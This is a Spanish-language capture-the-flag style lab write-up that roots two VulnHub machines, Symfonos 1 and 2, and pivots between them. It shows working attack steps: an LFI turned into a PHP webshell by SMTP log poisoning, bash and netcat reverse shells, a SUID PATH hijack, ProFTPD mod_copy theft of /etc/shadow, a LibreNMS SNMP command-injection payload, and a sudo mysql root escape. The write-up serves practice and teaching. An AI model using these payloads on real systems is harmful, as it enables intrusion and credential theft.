Symfonos es un par de máquinas de **VulnHub** (1 y 2) que conecté entre sí en VirtualBox para practicar **pivoting** de principio a fin, y es la cadena más rica de mi laboratorio del eJPTv2 hasta ahora. **Symfonos 1** está en una red host-only y en una interna aislada; **Symfonos 2** vive solo en esa `10.0.0.0/24` interna, accesible únicamente a través del primer host. Por el camino: enumeración de SMB por null-session y una pista de contraseñas con temática, una LFI de **Mail Masta** en WordPress (**CVE-2016-10956**) convertida en RCE vía **log poisoning por SMTP**, un binario SUID con **PATH hijacking** para root, y luego un doble pivot con `socat` hacia Symfonos 2 — **ProFTPD `mod_copy`** (**CVE-2015-3306**) para robar `/etc/shadow`, un hash crackeado, un *segundo* pivot a un panel interno de **LibreNMS** explotado a mano para una shell, y `sudo mysql` a root. He conservado mis propios scripts y sesiones en su totalidad.

## Montaje del Laboratorio

Ambas VMs corren en VirtualBox. **Symfonos 1** tiene dos NICs — un adaptador host-only (`192.168.56.0/24`, mi host es el `.1`) y una red interna (`10.0.0.0/24`). **Symfonos 2** solo tiene la NIC interna, así que es invisible desde mi host hasta que tunelizo a través de la primera máquina. Un ARP scan encuentra a Symfonos 1:

```bash
sudo arp-scan -I vboxnet0 --localnet
# 192.168.56.6   08:00:27:4e:f1:e8   PCS Systemtechnik GmbH
```

# Symfonos 1 — 192.168.56.6

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV 192.168.56.6 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
25/tcp  open  smtp        Postfix smtpd (symfonos.localdomain; VRFY activado)
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

SSH, un servidor SMTP, Apache y Samba. SMB es lo más fácil de enumerar sin credenciales, así que va primero.

### SMB — recurso anónimo y una pista de contraseñas

Una null session lista los recursos. `anonymous` es legible por todos, y `helios` ("Helios personal share") insinúa un usuario al que aún no llegamos:

```bash
smbmap -u '' -p '' -H 192.168.56.6
#   print$      NO ACCESS   Printer Drivers
#   helios      NO ACCESS   Helios personal share
#   anonymous   READ ONLY
#   IPC$        NO ACCESS   IPC Service (Samba 4.5.16-Debian)
```

El recurso `anonymous` guarda una única nota de "Zeus":

```bash
smbclient \\\\192.168.56.6\\anonymous -N
smb: \> get attention.txt
```

```text
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
Next person I find using one of these passwords will be fired!
-Zeus
```

Tres contraseñas, entregadas en bandeja. Las meto en un `passwords.txt` y las rocío con `netexec` — `zeus:epidioko` es válida (como Guest), y probándolas contra el recurso `helios`, **`helios:qwerty`** lo desbloquea:

```bash
cat passwords.txt
# epidioko
# qwerty
# baseball

netexec smb 192.168.56.6 -u zeus -p passwords.txt
# [+] \zeus:epidioko (Guest)

smbmap -u 'helios' -p 'qwerty' -H 192.168.56.6
#   helios   READ ONLY   Helios personal share       <-- ahora legible
```

```bash
smbclient \\\\192.168.56.6\\helios -U helios        # contraseña: qwerty
smb: \> get research.txt
smb: \> get todo.txt
```

`research.txt` es sabor de mitología griega, pero `todo.txt` es la pista:

```text
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### El sitio WordPress

`/h3l105` es una instalación de **WordPress 5.2.2**, pero carga roto hasta que añado su vhost — el código fuente de la página referencia `symfonos.local`:

```bash
curl -s http://192.168.56.6/h3l105/ | grep "symfonos.local"
# <link rel='dns-prefetch' href='//symfonos.local' />
echo "192.168.56.6 symfonos.local" | sudo tee -a /etc/hosts
```

`wpscan` enumera los plugins, y uno es un regalo — **Mail Masta 1.0**, vulnerable a una **Local File Inclusion** no autenticada (CVE-2016-10956):

```bash
wpscan --url http://symfonos.local/h3l105/ -e u,vp
# [+] mail-masta ... Unauthenticated Local File Inclusion (LFI)  CVE-2016-10956
# [+] site-editor ... Local File Inclusion (LFI)  CVE-2018-7422
# [+] admin  (user)
```

## Acceso Inicial — LFI de Mail Masta + Log Poisoning por SMTP (CVE-2016-10956)

El exploit (EDB 40290) documenta el parámetro vulnerable — `count_of_send.php?pl=` pasa directo a `include()`:

```bash
curl 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
# root:x:0:0:root:/root:/bin/bash
# ...
# helios:x:1000:1000:,,,:/home/helios:/bin/bash
```

`helios` no tiene claves SSH que robar, así que en vez de leer ficheros estáticos convierto la LFI en **RCE vía log poisoning**. El include renderiza como PHP cualquier fichero al que lo apunte, y puedo *escribir* en el spool de correo de `helios` enviándole un correo — así que meto una webshell PHP en el cuerpo del mensaje por una sesión SMTP escrita a mano:

```text
└─❯ telnet 192.168.56.6 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: Ander
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<pre> <?php system($_GET['cmd']); ?> </pre>
.
250 2.0.0 Ok: queued as 0D7F6406AE
```

Incluir el spool de correo ahora ejecuta el payload, y `cmd` corre comandos:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=ls+-l'
# ... <pre> total 112
# -rwxr-xr-x 1 helios helios 8126 Jun 28 2019 ajax_camp_send.php ...
```

RCE confirmado. Codifico en URL una reverse shell de Bash en `cmd` y la recibo:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%27'
```

```bash
nc -nlvp 4444
Connection received on 192.168.56.6 43112
helios@symfonos:~$      # el servidor web corre como helios
```

Una shell como **`helios`** (tras el tratamiento de la TTY).

## Escalada de Privilegios — SUID `statuscheck` (PATH Hijacking) → root

La búsqueda de SUID devuelve un binario a medida en `/opt`:

```bash
helios@symfonos:/opt$ find / -perm -4000 2>/dev/null
/opt/statuscheck
```

`strings` revela lo que hace — llama a `curl` con una **ruta relativa**, no `/usr/bin/curl`:

```bash
helios@symfonos:/opt$ strings statuscheck
# ...
# system
# curl -I H
# http://lH
# ocalhostH
```

Un binario SUID que ejecuta `curl` por su nombre es un **PATH hijack** de manual: pongo mi propio `curl` antes en el `PATH`, y el binario propiedad de root ejecuta el *mío* como root. Mi `curl` simplemente pone el bit SUID a bash:

```bash
helios@symfonos:/tmp$ cat curl
chmod u+s /bin/bash
helios@symfonos:/tmp$ chmod +x curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/opt$ ./statuscheck
helios@symfonos:/opt$ ls -la /bin/bash
# -rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash
```

Con bash ahora SUID-root, `-p` preserva los privilegios elevados:

```bash
helios@symfonos:/opt$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/proof.txt
# Congrats on rooting symfonos:1!   (ASCII art recortado)
```

Root en Symfonos 1.

## Pivoting hacia la Red Interna

Ya como root, `ip a` muestra la segunda interfaz — `enp0s8` en la `10.0.0.0/24` interna:

```bash
bash-4.4# ip a | grep -A2 enp0s8
# enp0s8: ... inet 10.0.0.102/24 ... scope global enp0s8
```

Primero monto persistencia para no depender de la frágil reverse shell — genero una clave como root y dejo la clave pública de mi host en `/root/.ssh/authorized_keys`, y así puedo hacer `ssh root@symfonos.local` cuando quiera. Un barrido de ping encuentra al vecino:

```bash
bash-4.4# for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.102 up   (la propia symfonos1)
# 10.0.0.103 up   (symfonos2)
```

No hay nmap en la máquina, así que uso un pequeño escáner de puertos en Bash con `/dev/tcp`:

```bash
# portScan.sh
IP=10.0.0.103

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "[+] Host $IP - Port $port (OPEN)" &
done
```

```bash
bash-4.4# ./portScan.sh
# [+] Host 10.0.0.103 - Port 21 (OPEN)
# [+] Host 10.0.0.103 - Port 22 (OPEN)
# [+] Host 10.0.0.103 - Port 80 (OPEN)
# [+] Host 10.0.0.103 - Port 139 (OPEN)
# [+] Host 10.0.0.103 - Port 445 (OPEN)
```

Luego reenvío cada uno de esos puertos hacia fuera a través de Symfonos 1 con `socat`, para que mi host pueda alcanzar los servicios de Symfonos 2 en `192.168.56.6` en un puerto `100xx`:

```bash
# pivot.sh
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &
socat TCP-LISTEN:10080,reuseaddr,fork TCP-CONNECT:10.0.0.103:80 &
socat TCP-LISTEN:10139,reuseaddr,fork TCP-CONNECT:10.0.0.103:139 &
socat TCP-LISTEN:10445,reuseaddr,fork TCP-CONNECT:10.0.0.103:445 &
```

# Symfonos 2 — 10.0.0.103 (a través del pivot)

## Reconocimiento a Través del Pivot

Escanear los puertos reenviados en `192.168.56.6` revela Symfonos 2 como si fuera local:

```bash
sudo nmap -p10021,10022,10080,10139,10445 -sCV 192.168.56.6 -oN nmap2
# 10021  ftp         ProFTPD 1.3.5
# 10022  ssh         OpenSSH 7.4p1 Debian
# 10080  http        WebFS httpd 1.21
# 10139  netbios-ssn Samba
# 10445  netbios-ssn Samba
```

El recurso SMB anónimo guarda un `backups/log.txt` que filtra la propia disposición de la máquina — un backup de `/etc/shadow` en `/var/backups/shadow.bak`, y que el recurso Samba `anonymous` mapea a `/home/aeolus/share`:

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N
smb: \> cd backups ; get log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
[anonymous]
   path = /home/aeolus/share
```

## ProFTPD mod_copy (CVE-2015-3306) — Robar el Fichero Shadow

**ProFTPD 1.3.5** tiene el módulo `mod_copy` habilitado, que expone `SITE CPFR`/`SITE CPTO` — una forma **no autenticada** de copiar cualquier fichero que el proceso de ProFTPD pueda leer a cualquier ruta donde pueda escribir. Como el recurso SMB `anonymous` *es* `/home/aeolus/share`, copio ficheros sensibles ahí y los leo por SMB. Primero `/etc/passwd` para conocer los usuarios:

```text
└─❯ nc 192.168.56.6 10021
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.103]
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.copy
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get passwd.copy'
cat passwd.copy | grep "sh$"
# root:x:0:0:root:/root:/bin/bash
# aeolus:x:1000:1000:,,,:/home/aeolus:/bin/bash
# cronus:x:1001:1001:,,,:/home/cronus:/bin/bash
```

Luego el backup de shadow que nos indicó el log:

```text
└─❯ nc 192.168.56.6 10021
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get shadow.bak'
cat shadow.bak
# root:$6$VTftENaZ$...
# aeolus:$6$dgjUjE.Y$...
# cronus:$6$wOmUfiZO$...
```

## Crackeo → `aeolus`

Los hashes `$6$` son sha512crypt (modo 1800 de hashcat); `aeolus` cae ante rockyou:

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# $6$dgjUjE.Y$...:sergioteamo
```

**`aeolus:sergioteamo`**. (La misma contraseña también cae con una fuerza bruta de `hydra` por FTP contra el puerto reenviado — `hydra -l aeolus -P rockyou.txt ftp://192.168.56.6 -s 10021` — una alternativa más lenta que crackear el hash offline.) Esas credenciales entran directamente por SSH a través del pivot:

```bash
ssh aeolus@192.168.56.6 -p 10022      # contraseña: sergioteamo
aeolus@symfonos2:~$ hostname -I
# 10.0.0.103
```

## Un Segundo Pivot — el Panel Interno de LibreNMS

Como `aeolus`, los servicios interesantes están atados solo a localhost — MySQL, SMTP, y una app web en `127.0.0.1:8080`:

```bash
aeolus@symfonos2:~$ ss -nltp
# LISTEN 127.0.0.1:3306
# LISTEN 127.0.0.1:8080
# LISTEN 127.0.0.1:25
```

Para llegar al `8080` desde mi host necesito **dos** saltos: Symfonos 2 reenvía su propio `8080` hacia la red interna, y Symfonos 1 lo reenvía a mi host.

```bash
# en symfonos2: exponer 127.0.0.1:8080 en la interfaz interna como :8000
aeolus@symfonos2:/tmp$ socat TCP-LISTEN:8000,reuseaddr,fork TCP-CONNECT:127.0.0.1:8080 &
```

```bash
# en symfonos1 (el pivot): reenviar :18000 → symfonos2:8000
bash-4.4# socat TCP-LISTEN:18000,reuseaddr,fork TCP-CONNECT:10.0.0.103:8000 &
```

Ahora mi host alcanza el panel en `192.168.56.6:18000` — es **LibreNMS**, y `aeolus:sergioteamo` entra:

```bash
curl http://192.168.56.6:18000
# Redirecting to http://192.168.56.6:18000/login
```

## RCE por `addhost` de LibreNMS → `cronus`

LibreNMS 1.46 tiene una **inyección de comandos** conocida en el flujo de *Add Device* (EDB 47044): la cadena **community** de SNMP se pasa sin sanitizar a un comando del SO cuando se sondea el dispositivo. El exploit ya hecho creaba el dispositivo pero nunca conseguía shell, así que lo hice a mano. En la página de **Add Device** pongo un hostname, activo SNMP, y meto un payload de reverse shell en el campo **Community** — apuntado a `10.0.0.103:4444`, donde `aeolus` está escuchando:

```text
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f) #
```

![Formulario Add Device de LibreNMS con el payload de reverse shell en el campo Community](/assets/img/VulnHub/Symfonos/cap1.png)

Con "Force add" marcado el dispositivo se guarda, y el payload se dispara cuando se sondea SNMP — lo lanzo desde **Capture Debug Information → SNMP → Run**:

![Página Capture Debug Information, pestaña SNMP, botón Run](/assets/img/VulnHub/Symfonos/cap2.png)

```bash
aeolus@symfonos2:~$ nc -nvlp 4444
connect to [10.0.0.103] from (UNKNOWN) [10.0.0.103] 57564
$ whoami
cronus       # LibreNMS corre como cronus
```

Una shell como **`cronus`**. Tras el tratamiento de la TTY vuelvo a dejar mi clave pública en `~/.ssh/authorized_keys` para acceso estable.

## Escalada de Privilegios — `sudo mysql` (GTFOBins) → root

`cronus` puede ejecutar `mysql` como root sin contraseña:

```bash
cronus@symfonos2:~$ sudo -l
# User cronus may run the following commands on symfonos2:
#     (root) NOPASSWD: /usr/bin/mysql
```

El `\!` de `mysql` ejecuta un comando de shell — y como corre como root, esa shell es root ([GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)):

```bash
cronus@symfonos2:~$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cat /root/proof.txt
# Congrats on rooting symfonos:2!   (ASCII art recortado)
```

Root en Symfonos 2 — ambas máquinas comprometidas, de principio a fin a través del pivot.

## Conclusiones Clave

- **Un aviso de política de contraseñas es un diccionario.** La nota de Zeus de "dejad de usar `epidioko`/`qwerty`/`baseball`" *era* el juego de credenciales — rociar esas tres con `netexec` desbloqueó el recurso `helios`. Las pistas de contraseñas, los banners y los ficheros de política son oro para la enumeración.
- **La LFI se convierte en RCE allá donde puedas escribir un log.** Mail Masta solo *incluía* ficheros, pero el spool de correo es un fichero en el que puedo escribir enviando un correo — un mensaje SMTP escrito a mano con PHP en el cuerpo convirtió CVE-2016-10956 en ejecución de comandos. El correo, los logs de auth y los de web son todos candidatos.
- **Un comando relativo en un binario SUID es root.** Que `statuscheck` llamara a `curl` por su nombre me dejó suplantarlo vía `PATH` y ejecutar mi propio código como root. Cualquier programa SUID que invoque otro binario sin ruta absoluta es un primitivo de PATH-hijack — `strings` los encuentra rápido.
- **El pivoting es por capas, no un solo salto.** Llegar a Symfonos 2 requirió un reenvío `socat` por puerto; llegar a su LibreNMS atado a localhost requirió un *segundo* `socat` en cada host. Scriptear los reenvíos (`portScan.sh`, `pivot.sh`) mantiene el doble túnel manejable y repetible.
- **`mod_copy` es lectura/escritura de ficheros pre-auth.** El `SITE CPFR`/`CPTO` de ProFTPD copió `/etc/shadow` a una ruta legible por SMB sin ningún login — un recordatorio de que un recurso "anónimo, de solo lectura" más un primitivo de copia no autenticado equivale a divulgación total de credenciales.
- **Las herramientas de monitorización ejecutan comandos para ganarse la vida.** LibreNMS sondea dispositivos haciendo shell-out, así que una cadena de community SNMP sin sanitizar es RCE como la cuenta de servicio. El acceso de admin a un NMS está cerca de la ejecución de código en su host por diseño — segméntalos y asegúralos en consecuencia.
